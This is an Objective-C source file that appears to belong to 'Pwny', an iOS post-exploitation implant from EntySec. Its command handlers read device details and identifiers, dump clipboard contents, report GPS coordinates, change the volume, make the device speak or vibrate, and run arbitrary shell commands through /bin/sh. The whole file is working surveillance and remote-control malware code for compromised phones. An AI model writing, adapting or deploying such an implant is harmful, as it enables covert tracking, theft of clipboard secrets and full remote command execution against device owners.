/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#import "pwny.h"

@implementation Pwny

@synthesize console;

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];
    console = [[Console alloc] init];
    return self;
}

-(void)cmd_sysinfo {
    UIDevice* device = [UIDevice currentDevice];
    int batinfo = ([_thisUIDevice batteryLevel] * 100);
    NSString* info = [NSString stringWithFormat:@"Model: %@\nBattery: %d\nVersion: %@\nName: %@\nUUID: %@\n",
                      [device model], batinfo, [device systemVersion], [device name],
                      [[device identifierForVendor] UUIDString]];
    [console console_log:info];
}

-(void)cmd_getpid {
    NSProcessInfo* processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [console console_log:[NSString stringWithFormat:@"%d\n", processID]];
}

-(void)cmd_getpaste {
    UIPasteboard* pb = [UIPasteboard generalPasteboard];
    if ([pb.strings count] > 1) {
        NSUInteger count = 0;
        for (NSString* pstring in pb.strings){
            [console console_log:[NSString stringWithFormat:@"%lu: %@\n", count, pstring]];
            count++;
        }
    } else if ([pb.strings count] == 1)
        [console console_log:[NSString stringWithFormat:@"%@\n", [pb.strings firstObject]]];
}

-(void)cmd_battery {
    int batteryLevelLocal = ([_thisUIDevice batteryLevel] * 100);
    NSString *info = [NSString stringWithFormat:@"Battery level: %d%%\nDevice is%@charging\n",
                      batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @" " : @" not "];
    [console console_log:info];
}

-(void)cmd_getvol {
    [[AVAudioSession sharedInstance] setActive:YES error:nil];
    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
    [console console_log:[NSString stringWithFormat:@"%.2f\n", [AVAudioSession sharedInstance].outputVolume]];
}

-(void)cmd_locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
    [manager startUpdatingLocation];
    CLLocation* location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];
    NSString* result = [NSString stringWithFormat:@"Latitude: %f\nLongitude: %f\nMap: http://maps.google.com/maps?q=%f,%f\n", coordinate.latitude, coordinate.longitude, coordinate.latitude, coordinate.longitude];
    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
        result = @"Unable to get device location!\n";
    }
    [console console_log:result];
}

-(void)cmd_vibrate {
    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
}

-(void)cmd_exec:(NSString *)command {
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/bin/sh"];
    NSArray *arguments = [NSArray arrayWithObjects: @"-c", [NSString stringWithFormat:@"%@", command], nil];
    [task setArguments:arguments];
    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];
    NSFileHandle *file = [pipe fileHandleForReading];
    [task launch];
    NSData *data = [file readDataToEndOfFile];
    [console console_log:[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]];
}

-(void)cmd_say:(NSString *)message {
    AVSpeechSynthesizer *synthesizer = [[AVSpeechSynthesizer alloc] init];
    AVSpeechUtterance* utterance = [AVSpeechUtterance speechUtteranceWithString:message];
    utterance.rate = 0.5;

    NSString *language = [[NSLocale currentLocale] localeIdentifier];
    NSDictionary *languageDic = [NSLocale componentsFromLocaleIdentifier:language];

    NSString *countryCode = [languageDic objectForKey:NSLocaleCountryCode];
    NSString *languageCode = [languageDic objectForKey:NSLocaleLanguageCode];
    NSString *languageForVoice = [[NSString stringWithFormat:@"%@-%@", [languageCode lowercaseString], countryCode] lowercaseString];

    utterance.voice = [AVSpeechSynthesisVoice voiceWithLanguage:languageForVoice];
    [synthesizer speakUtterance:utterance];
}

-(void)cmd_setvol:(NSString *)level {
    MPVolumeView* volumeView = [[MPVolumeView alloc] init];
    UISlider* volumeViewSlider = nil;
    for (UIView* view in [volumeView subviews]) {
        if ([view.class.description isEqualToString:@"MPVolumeSlider"]) {
            volumeViewSlider = (UISlider*)view;
            break;
        }
    }
    [volumeViewSlider setValue:[level floatValue] animated:NO];
    [volumeViewSlider sendActionsForControlEvents:UIControlEventTouchUpInside];
}

@end
